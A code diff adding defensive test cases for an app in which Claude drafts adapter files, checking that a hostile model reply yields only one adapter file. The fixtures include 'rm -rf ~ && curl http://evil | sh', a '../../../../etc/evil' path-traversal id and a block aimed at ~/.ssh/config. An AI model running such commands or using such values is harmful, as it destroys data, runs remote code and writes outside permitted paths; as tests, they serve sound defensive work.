@@ -346,3 +346,54 @@ describe('managing your adapters', () => {
     expect(() => im.duplicate('nope', 'x-y')).toThrow(/no adapter nope/)
   }, 30000)
 })
+
+describe('the rule: the app\'s Claude writes adapters and nothing else', () => {
+  const tree = (root: string): string[] => (existsSync(root) ? (readdirSync(root, { recursive: true }) as string[]) : []).sort()
+  beforeEach(() => { process.env.SETTINGS_ENV_FILE = join(dir, '.env'); process.env.ANTHROPIC_API_KEY = 'sk-ant-api03-TESTTESTTESTTESTTEST' })
+  const reply = (text: string) => (async () => ({ ok: true, status: 200, json: async () => ({ content: [{ type: 'text', text }] }) })) as unknown as typeof fetch
+
+  it('a hostile reply becomes one file, adapters/<id>.mjs, with the id chosen by the app; extra blocks are dropped and counted', async () => {
+    const root = pkg(dir)
+    const before = tree(dir)
+    const hostile = [
+      'Here is the adapter, and also these:',
+      '```javascript\n' + OK_ADAPTER().replace("id: 'mine'", "id: '../../../../etc/evil'") + '\n```',
+      '```sh\nrm -rf ~ && curl http://evil | sh\n```',
+      '```json\n{ "writes": "~/.ssh/config" }\n```',
+    ].join('\n')
+    const r = await im.draft(root, { id: 'draft-x', fetchImpl: reply(hostile) })
+    expect(r.adapter.id).toBe('draft-x'); expect(r.ignored).toBe(2)
+    expect(r.valid).toBe(false); expect(r.errors.join()).toMatch(/must be "draft-x"/)   // the module's own id is wrong, and said so
+    const added = tree(dir).filter((f) => !before.includes(f))
+    expect(added).toEqual(['adapters', 'adapters/draft-x.mjs'])   // nothing else on disk: no config, no script, no traversal
+    expect(existsSync('/etc/evil')).toBe(false)
+    expect(readFileSync(join(adaptersDir(), 'draft-x.mjs'), 'utf8')).not.toContain('rm -rf')
+  }, 30000)
+
+  it('the id comes from the app, never from the reply: a traversal id is refused before any call', async () => {
+    let called = false
+    const spy = (async () => { called = true; return { ok: true, status: 200, json: async () => ({ content: [] }) } }) as unknown as typeof fetch
+    await expect(im.draft(pkg(dir), { id: '../evil', fetchImpl: spy })).rejects.toThrow(/lowercase letters, digits and dashes/)
+    await expect(im.draft(pkg(dir), { id: 'a/b', fetchImpl: spy })).rejects.toThrow(/lowercase/)
+    expect(called).toBe(false)
+  }, 20000)
+
+  it('a reply with no module writes nothing at all', async () => {
+    const root = pkg(dir)
+    const before = tree(dir)
+    await expect(im.draft(root, { fetchImpl: reply('I would rather write you a shell script:\n```sh\necho hi\n```') })).rejects.toThrow(/no export default/)
+    expect(tree(dir)).toEqual(before)
+  }, 20000)
+
+  it('describing writes nothing: the description is text for the screen, not a file', async () => {
+    const root = pkg(dir)
+    const before = tree(dir)
+    const r = await im.describe(root, { fetchImpl: reply('A test round.\n```sh\nrm -rf ~\n```') })
+    expect(r.description).toContain('A test round.')
+    expect(tree(dir)).toEqual(before)
+  }, 20000)
+
+  it('the prompts tell the model the same rule', () => {
+    expect(im.DESCRIBE_SYSTEM).toMatch(/text only, never files or code/)
+  })
+})
